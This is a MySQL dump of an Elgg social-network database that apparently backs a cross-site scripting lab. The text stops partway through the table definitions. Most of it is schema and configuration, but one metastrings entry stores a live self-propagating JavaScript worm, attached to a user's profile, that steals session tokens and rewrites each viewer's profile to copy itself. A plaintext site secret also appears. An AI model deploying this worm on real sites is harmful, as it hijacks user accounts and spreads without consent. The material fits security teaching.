-- MySQL dump 10.13  Distrib 5.7.19, for Linux (i686)
--
-- Host: localhost    Database: elgg_xss
-- ------------------------------------------------------
-- Server version	5.7.19-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `elgg_xssaccess_collection_membership`
--

DROP TABLE IF EXISTS `elgg_xssaccess_collection_membership`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssaccess_collection_membership` (
  `user_guid` int(11) NOT NULL,
  `access_collection_id` int(11) NOT NULL,
  PRIMARY KEY (`user_guid`,`access_collection_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssaccess_collection_membership`
--

LOCK TABLES `elgg_xssaccess_collection_membership` WRITE;
/*!40000 ALTER TABLE `elgg_xssaccess_collection_membership` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssaccess_collection_membership` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssaccess_collections`
--

DROP TABLE IF EXISTS `elgg_xssaccess_collections`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssaccess_collections` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `owner_guid` bigint(20) unsigned NOT NULL,
  `site_guid` bigint(20) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `owner_guid` (`owner_guid`),
  KEY `site_guid` (`site_guid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssaccess_collections`
--

LOCK TABLES `elgg_xssaccess_collections` WRITE;
/*!40000 ALTER TABLE `elgg_xssaccess_collections` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssaccess_collections` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssannotations`
--

DROP TABLE IF EXISTS `elgg_xssannotations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssannotations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `entity_guid` bigint(20) unsigned NOT NULL,
  `name_id` int(11) NOT NULL,
  `value_id` int(11) NOT NULL,
  `value_type` enum('integer','text') NOT NULL,
  `owner_guid` bigint(20) unsigned NOT NULL,
  `access_id` int(11) NOT NULL,
  `time_created` int(11) NOT NULL,
  `enabled` enum('yes','no') NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`id`),
  KEY `entity_guid` (`entity_guid`),
  KEY `name_id` (`name_id`),
  KEY `value_id` (`value_id`),
  KEY `owner_guid` (`owner_guid`),
  KEY `access_id` (`access_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssannotations`
--

LOCK TABLES `elgg_xssannotations` WRITE;
/*!40000 ALTER TABLE `elgg_xssannotations` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssannotations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssapi_users`
--

DROP TABLE IF EXISTS `elgg_xssapi_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssapi_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `site_guid` bigint(20) unsigned DEFAULT NULL,
  `api_key` varchar(40) DEFAULT NULL,
  `secret` varchar(40) NOT NULL,
  `active` int(1) DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `api_key` (`api_key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssapi_users`
--

LOCK TABLES `elgg_xssapi_users` WRITE;
/*!40000 ALTER TABLE `elgg_xssapi_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssapi_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssconfig`
--

DROP TABLE IF EXISTS `elgg_xssconfig`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssconfig` (
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  `site_guid` int(11) NOT NULL,
  PRIMARY KEY (`name`,`site_guid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssconfig`
--

LOCK TABLES `elgg_xssconfig` WRITE;
/*!40000 ALTER TABLE `elgg_xssconfig` DISABLE KEYS */;
INSERT INTO `elgg_xssconfig` VALUES ('view','s:7:\"default\";',1),('language','s:2:\"en\";',1),('default_access','s:1:\"2\";',1),('allow_registration','b:1;',1),('walled_garden','b:0;',1),('allow_user_default_access','s:0:\"\";',1),('default_limit','i:10;',1),('search_ft_min_word_len','s:1:\"4\";',1),('search_ft_max_word_len','s:2:\"84\";',1);
/*!40000 ALTER TABLE `elgg_xssconfig` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssdatalists`
--

DROP TABLE IF EXISTS `elgg_xssdatalists`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssdatalists` (
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssdatalists`
--

LOCK TABLES `elgg_xssdatalists` WRITE;
/*!40000 ALTER TABLE `elgg_xssdatalists` DISABLE KEYS */;
INSERT INTO `elgg_xssdatalists` VALUES ('installed','1501099480'),('dataroot','/var/elgg/xss/'),('default_site','1'),('version','2015062900'),('simplecache_enabled','1'),('system_cache_enabled','1'),('simplecache_lastupdate','1718890464'),('processed_upgrades','a:1:{i:0;s:56:\"2015062900-1.11.2-discussion_plugin-e28c7afa4f5f24ec.php\";}'),('admin_registered','1'),('__site_secret__','ztU1opJwlVS4mucThuw2QzqIejeRuAMh');
/*!40000 ALTER TABLE `elgg_xssdatalists` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssentities`
--

DROP TABLE IF EXISTS `elgg_xssentities`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssentities` (
  `guid` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `type` enum('object','user','group','site') NOT NULL,
  `subtype` int(11) DEFAULT NULL,
  `owner_guid` bigint(20) unsigned NOT NULL,
  `site_guid` bigint(20) unsigned NOT NULL,
  `container_guid` bigint(20) unsigned NOT NULL,
  `access_id` int(11) NOT NULL,
  `time_created` int(11) NOT NULL,
  `time_updated` int(11) NOT NULL,
  `last_action` int(11) NOT NULL DEFAULT '0',
  `enabled` enum('yes','no') NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`guid`),
  KEY `type` (`type`),
  KEY `subtype` (`subtype`),
  KEY `owner_guid` (`owner_guid`),
  KEY `site_guid` (`site_guid`),
  KEY `container_guid` (`container_guid`),
  KEY `access_id` (`access_id`),
  KEY `time_created` (`time_created`),
  KEY `time_updated` (`time_updated`)
) ENGINE=MyISAM AUTO_INCREMENT=52 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssentities`
--

LOCK TABLES `elgg_xssentities` WRITE;
/*!40000 ALTER TABLE `elgg_xssentities` DISABLE KEYS */;
INSERT INTO `elgg_xssentities` VALUES (1,'site',0,0,1,0,2,1501099480,1501099480,1501099480,'yes'),(2,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(3,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(4,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(5,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(6,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(7,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(8,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(9,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(10,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(11,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(12,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(13,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(14,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(15,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(16,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(17,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(18,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(19,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(20,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(21,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(22,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(23,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(24,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(25,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(26,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(27,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(28,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(29,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(30,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(31,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(32,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(33,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(34,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(35,'object',1,1,1,1,2,1501099481,1501099481,1501099481,'yes'),(36,'user',0,0,1,0,2,1501099509,1501099509,1501099509,'yes'),(37,'object',3,36,1,36,0,1501099509,1501099509,1501099509,'yes'),(38,'object',3,36,1,36,0,1501099509,1501099509,1501099509,'yes'),(39,'object',3,36,1,36,0,1501099509,1501099509,1501099509,'yes'),(40,'object',3,36,1,36,0,1501099509,1501099509,1501099509,'yes'),(41,'object',3,36,1,36,0,1501099509,1501099509,1501099509,'yes'),(42,'object',1,1,1,1,2,1501099735,1501099735,1501099735,'yes'),(43,'object',1,1,1,1,2,1501099735,1501099735,1501099735,'yes'),(44,'user',0,0,1,0,2,1501100987,1501100988,1501101320,'yes'),(45,'user',0,0,1,0,2,1501101009,1501101009,1501101353,'yes'),(46,'user',0,0,1,0,2,1501101040,1501101040,1501101388,'yes'),(47,'user',0,0,1,0,2,1501101059,1718890594,1501101421,'yes'),(48,'object',3,44,1,44,2,1515966478,1515966478,1515966478,'yes'),(49,'object',3,45,1,45,2,1515966495,1515966495,1515966495,'yes'),(50,'object',3,46,1,46,2,1515966514,1515966514,1515966514,'yes'),(51,'object',3,47,1,47,2,1515966530,1515966530,1515966530,'yes');
/*!40000 ALTER TABLE `elgg_xssentities` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssentity_relationships`
--

DROP TABLE IF EXISTS `elgg_xssentity_relationships`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssentity_relationships` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `guid_one` bigint(20) unsigned NOT NULL,
  `relationship` varchar(50) NOT NULL,
  `guid_two` bigint(20) unsigned NOT NULL,
  `time_created` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `guid_one` (`guid_one`,`relationship`,`guid_two`),
  KEY `relationship` (`relationship`),
  KEY `guid_two` (`guid_two`)
) ENGINE=MyISAM AUTO_INCREMENT=30 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssentity_relationships`
--

LOCK TABLES `elgg_xssentity_relationships` WRITE;
/*!40000 ALTER TABLE `elgg_xssentity_relationships` DISABLE KEYS */;
INSERT INTO `elgg_xssentity_relationships` VALUES (1,2,'active_plugin',1,1501099481),(2,3,'active_plugin',1,1501099481),(3,4,'active_plugin',1,1501099481),(4,5,'active_plugin',1,1501099481),(5,10,'active_plugin',1,1501099481),(6,13,'active_plugin',1,1501099481),(7,14,'active_plugin',1,1501099481),(8,15,'active_plugin',1,1501099481),(25,44,'member_of_site',1,1501100987),(10,17,'active_plugin',1,1501099481),(11,19,'active_plugin',1,1501099481),(12,20,'active_plugin',1,1501099481),(13,21,'active_plugin',1,1501099481),(14,22,'active_plugin',1,1501099481),(15,23,'active_plugin',1,1501099481),(16,24,'active_plugin',1,1501099481),(17,25,'active_plugin',1,1501099481),(18,26,'active_plugin',1,1501099481),(19,27,'active_plugin',1,1501099481),(20,28,'active_plugin',1,1501099481),(21,29,'active_plugin',1,1501099481),(22,32,'active_plugin',1,1501099481),(23,34,'active_plugin',1,1501099481),(24,36,'member_of_site',1,1501099509),(26,45,'member_of_site',1,1501101009),(27,46,'member_of_site',1,1501101040),(28,47,'member_of_site',1,1501101059),(29,16,'active_plugin',1,1718890464);
/*!40000 ALTER TABLE `elgg_xssentity_relationships` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssentity_subtypes`
--

DROP TABLE IF EXISTS `elgg_xssentity_subtypes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssentity_subtypes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` enum('object','user','group','site') NOT NULL,
  `subtype` varchar(50) NOT NULL,
  `class` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `type` (`type`,`subtype`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssentity_subtypes`
--

LOCK TABLES `elgg_xssentity_subtypes` WRITE;
/*!40000 ALTER TABLE `elgg_xssentity_subtypes` DISABLE KEYS */;
INSERT INTO `elgg_xssentity_subtypes` VALUES (1,'object','plugin','ElggPlugin'),(2,'object','file','ElggFile'),(3,'object','widget','ElggWidget'),(4,'object','comment','ElggComment'),(5,'object','elgg_upgrade','ElggUpgrade'),(6,'object','blog','ElggBlog'),(7,'object','discussion_reply','ElggDiscussionReply'),(8,'object','thewire','ElggWire');
/*!40000 ALTER TABLE `elgg_xssentity_subtypes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssgeocode_cache`
--

DROP TABLE IF EXISTS `elgg_xssgeocode_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssgeocode_cache` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `location` varchar(128) DEFAULT NULL,
  `lat` varchar(20) DEFAULT NULL,
  `long` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `location` (`location`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssgeocode_cache`
--

LOCK TABLES `elgg_xssgeocode_cache` WRITE;
/*!40000 ALTER TABLE `elgg_xssgeocode_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssgeocode_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssgroups_entity`
--

DROP TABLE IF EXISTS `elgg_xssgroups_entity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssgroups_entity` (
  `guid` bigint(20) unsigned NOT NULL,
  `name` text NOT NULL,
  `description` text NOT NULL,
  PRIMARY KEY (`guid`),
  KEY `name` (`name`(50)),
  KEY `description` (`description`(50)),
  FULLTEXT KEY `name_2` (`name`,`description`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssgroups_entity`
--

LOCK TABLES `elgg_xssgroups_entity` WRITE;
/*!40000 ALTER TABLE `elgg_xssgroups_entity` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xssgroups_entity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xsshmac_cache`
--

DROP TABLE IF EXISTS `elgg_xsshmac_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xsshmac_cache` (
  `hmac` varchar(255) NOT NULL,
  `ts` int(11) NOT NULL,
  PRIMARY KEY (`hmac`),
  KEY `ts` (`ts`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xsshmac_cache`
--

LOCK TABLES `elgg_xsshmac_cache` WRITE;
/*!40000 ALTER TABLE `elgg_xsshmac_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `elgg_xsshmac_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssmetadata`
--

DROP TABLE IF EXISTS `elgg_xssmetadata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssmetadata` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `entity_guid` bigint(20) unsigned NOT NULL,
  `name_id` int(11) NOT NULL,
  `value_id` int(11) NOT NULL,
  `value_type` enum('integer','text') NOT NULL,
  `owner_guid` bigint(20) unsigned NOT NULL,
  `access_id` int(11) NOT NULL,
  `time_created` int(11) NOT NULL,
  `enabled` enum('yes','no') NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`id`),
  KEY `entity_guid` (`entity_guid`),
  KEY `name_id` (`name_id`),
  KEY `value_id` (`value_id`),
  KEY `owner_guid` (`owner_guid`),
  KEY `access_id` (`access_id`)
) ENGINE=MyISAM AUTO_INCREMENT=42 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssmetadata`
--

LOCK TABLES `elgg_xssmetadata` WRITE;
/*!40000 ALTER TABLE `elgg_xssmetadata` DISABLE KEYS */;
INSERT INTO `elgg_xssmetadata` VALUES (1,1,1,2,'text',0,2,1501099480,'yes'),(2,36,3,4,'text',36,2,1501099509,'yes'),(3,36,5,4,'text',0,2,1501099509,'yes'),(4,36,6,7,'text',0,2,1501099509,'yes'),(5,44,3,4,'text',44,2,1501100988,'yes'),(6,44,12,4,'text',44,2,1501100988,'yes'),(7,44,13,9,'integer',44,2,1501100988,'yes'),(8,45,3,4,'text',45,2,1501101009,'yes'),(9,45,12,4,'text',45,2,1501101009,'yes'),(10,45,13,9,'integer',45,2,1501101009,'yes'),(11,46,3,4,'text',46,2,1501101040,'yes'),(12,46,12,4,'text',46,2,1501101040,'yes'),(13,46,13,9,'integer',46,2,1501101040,'yes'),(14,47,3,4,'text',47,2,1501101059,'yes'),(15,47,12,4,'text',47,2,1501101059,'yes'),(16,47,13,9,'integer',47,2,1501101059,'yes'),(23,44,15,26,'integer',44,2,1501101320,'yes'),(24,44,18,27,'integer',44,2,1501101320,'yes'),(25,44,20,11,'integer',44,2,1501101320,'yes'),(26,44,22,28,'integer',44,2,1501101320,'yes'),(22,44,24,25,'integer',44,2,1501101307,'yes'),(28,45,15,31,'integer',45,2,1501101353,'yes'),(30,46,15,34,'integer',46,2,1501101388,'yes'),(31,46,18,11,'integer',46,2,1501101388,'yes'),(32,46,20,11,'integer',46,2,1501101388,'yes'),(33,46,22,35,'integer',46,2,1501101388,'yes'),(34,46,24,35,'integer',46,2,1501101388,'yes'),(36,47,15,38,'integer',47,2,1501101421,'yes'),(37,47,18,39,'integer',47,2,1501101421,'yes'),(38,47,20,40,'integer',47,2,1501101421,'yes'),(39,47,22,41,'integer',47,2,1501101421,'yes'),(40,47,24,42,'integer',47,2,1501101421,'yes'),(41,47,43,44,'text',47,2,1718890594,'yes');
/*!40000 ALTER TABLE `elgg_xssmetadata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssmetastrings`
--

DROP TABLE IF EXISTS `elgg_xssmetastrings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssmetastrings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `string` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `string` (`string`(50))
) ENGINE=MyISAM AUTO_INCREMENT=45 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssmetastrings`
--

LOCK TABLES `elgg_xssmetastrings` WRITE;
/*!40000 ALTER TABLE `elgg_xssmetastrings` DISABLE KEYS */;
INSERT INTO `elgg_xssmetastrings` VALUES (1,'email'),(2,'info@example.com'),(3,'notification:method:email'),(4,'1'),(5,'validated'),(6,'validated_method'),(7,'admin_user'),(8,'toId'),(9,'36'),(10,'readYet'),(11,'0'),(12,'admin_created'),(13,'created_by_guid'),(14,'44'),(15,'icontime'),(16,'1501101295'),(17,'1501101307'),(18,'x1'),(19,'13'),(20,'y1'),(21,'62'),(22,'x2'),(23,'368'),(24,'y2'),(25,'417'),(26,'1501101320'),(27,'32'),(28,'449'),(29,'45'),(30,'1501101349'),(31,'1501101353'),(32,'46'),(33,'1501101378'),(34,'1501101388'),(35,'299'),(36,'47'),(37,'1501101409'),(38,'1501101421'),(39,'104'),(40,'2'),(41,'452'),(42,'350'),(43,'description'),(44,'window.onload = function() {\r\n		var headerTag = \"\";\r\n		var jscodeTag = document.getElementById(\"worm\").innerHTML;\r\n		var footerTag = \"&lt;/\"+\"script&gt;\"\r\n		var wormcode = encodeURIComponent(headerTag+jscodeTag+footerTag);\r\n		var elgg_ts = \"&amp;__elgg_ts=\" + elgg.security.token.__elgg_ts;\r\n		var elgg_token = \"&amp;__elgg_token=\" + elgg.security.token.__elgg_token;\r\n		var guid = \"&amp;guid=\" + elgg.session.user.guid;\r\n		var name = \"&amp;name=\" + elgg.session.user.name;\r\n		var desc = \"&amp;description=Samy is my hero.\" + wormcode + \"&amp;accesslevel[description]=2\";\r\n		var content = elgg_token + elgg_ts + name + desc + guid;\r\n		var sendurl = \"http://www.xsslabelgg.com/action/profile/edit\";\r\n		if (elgg.session.user.guid != 47) {\r\n			var Ajax = null;\r\n			Ajax = new XMLHttpRequest();\r\n			Ajax.open(\"POST\",sendurl,true);\r\n			Ajax.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\r\n			Ajax.send(content);\r\n		}\r\n	}');
/*!40000 ALTER TABLE `elgg_xssmetastrings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssobjects_entity`
--

DROP TABLE IF EXISTS `elgg_xssobjects_entity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssobjects_entity` (
  `guid` bigint(20) unsigned NOT NULL,
  `title` text NOT NULL,
  `description` text NOT NULL,
  PRIMARY KEY (`guid`),
  FULLTEXT KEY `title` (`title`,`description`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssobjects_entity`
--

LOCK TABLES `elgg_xssobjects_entity` WRITE;
/*!40000 ALTER TABLE `elgg_xssobjects_entity` DISABLE KEYS */;
INSERT INTO `elgg_xssobjects_entity` VALUES (2,'aalborg_theme',''),(3,'blog',''),(4,'bookmarks',''),(5,'ckeditor',''),(6,'custom_index',''),(7,'dashboard',''),(8,'developers',''),(9,'diagnostics',''),(10,'discussions',''),(11,'embed',''),(12,'externalpages',''),(13,'file',''),(14,'garbagecollector',''),(15,'groups',''),(16,'htmlawed',''),(17,'invitefriends',''),(18,'legacy_urls',''),(19,'likes',''),(20,'logbrowser',''),(21,'logrotate',''),(22,'members',''),(23,'messageboard',''),(24,'messages',''),(25,'notifications',''),(26,'pages',''),(27,'profile',''),(28,'reportedcontent',''),(29,'search',''),(30,'site_notifications',''),(31,'tagcloud',''),(32,'thewire',''),(33,'twitter_api',''),(34,'uservalidationbyemail',''),(35,'web_services',''),(37,'',''),(38,'',''),(39,'',''),(40,'',''),(41,'',''),(42,'data_views',''),(43,'login_as',''),(48,'',''),(49,'',''),(50,'',''),(51,'','');
/*!40000 ALTER TABLE `elgg_xssobjects_entity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssprivate_settings`
--

DROP TABLE IF EXISTS `elgg_xssprivate_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `elgg_xssprivate_settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `entity_guid` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `entity_guid` (`entity_guid`,`name`),
  KEY `name` (`name`),
  KEY `value` (`value`(50))
) ENGINE=MyISAM AUTO_INCREMENT=80 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `elgg_xssprivate_settings`
--

LOCK TABLES `elgg_xssprivate_settings` WRITE;
/*!40000 ALTER TABLE `elgg_xssprivate_settings` DISABLE KEYS */;
INSERT INTO `elgg_xssprivate_settings` VALUES (1,2,'elgg:internal:priority','34'),(2,3,'elgg:internal:priority','1'),(3,4,'elgg:internal:priority','2'),(4,5,'elgg:internal:priority','3'),(5,6,'elgg:internal:priority','4'),(6,7,'elgg:internal:priority','5'),(7,8,'elgg:internal:priority','6'),(8,9,'elgg:internal:priority','7'),(9,10,'elgg:internal:priority','8'),(10,11,'elgg:internal:priority','9'),(11,12,'elgg:internal:priority','10'),(12,13,'elgg:internal:priority','11'),(13,14,'elgg:internal:priority','12'),(14,15,'elgg:internal:priority','13'),(15,16,'elgg:internal:priority','14'),(16,17,'elgg:internal:priority','15'),(17,18,'elgg:internal:priority','16'),(18,19,'elgg:internal:priority','17'),(19,20,'elgg:internal:priority','18'),(20,21,'elgg:internal:priority','19'),(21,22,'elgg:internal:priority','20'),(22,23,'elgg:internal:priority','21'),(23,24,'elgg:internal:priority','22'),(24,25,'elgg:internal:priority','23'),(25,26,'elgg:internal:priority','24'),(26,27,'elgg:internal:priority','25'),(27,28,'elgg:internal:priority','26'),(28,29,'elgg:internal:priority','27'),(29,30,'elgg:internal:priority','28'),(30,31,'elgg:internal:priority','29'),(31,32,'elgg:internal:priority','30'),(32,33,'elgg:internal:priority','31'),(33,34,'elgg:internal:priority','32'),(34,35,'elgg:internal:priority','33'),(35,32,'limit','140'),(36,37,'handler','control_panel'),(37,37,'context','admin'),(38,37,'column','1'),(39,37,'order','0'),(40,38,'handler','admin_welcome'),(41,38,'context','admin'),(42,38,'order','10'),(43,38,'column','1'),(44,39,'handler','online_users'),(45,39,'context','admin'),(46,39,'column','2'),(47,39,'order','0'),(48,40,'handler','new_users'),(49,40,'context','admin'),(50,40,'order','10'),(51,40,'column','2'),(52,41,'handler','content_stats'),(53,41,'context','admin'),(54,41,'order','20'),(55,41,'column','2'),(56,42,'elgg:internal:priority','35'),(57,43,'elgg:internal:priority','36'),(58,48,'handler','friends'),(59,48,'context','profile'),(60,48,'column','1'),(61,48,'order','0'),(62,48,'icon_size','small'),(63,49,'handler','friends'),(64,49,'context','profile'),(65,49,'column','1'),(66,49,'order','0'),(67,49,'icon_size','small'),(68,50,'handler','friends'),(69,50,'context','profile'),(70,50,'column','1'),(71,50,'order','0'),(72,50,'icon_size','small'),(73,51,'handler','friends'),(74,51,'context','profile'),(75,51,'column','1'),(76,51,'order','0'),(77,51,'icon_size','small');
/*!40000 ALTER TABLE `elgg_xssprivate_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `elgg_xssqueue`
--

DROP TABLE IF EXISTS `elgg_xssqueue`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
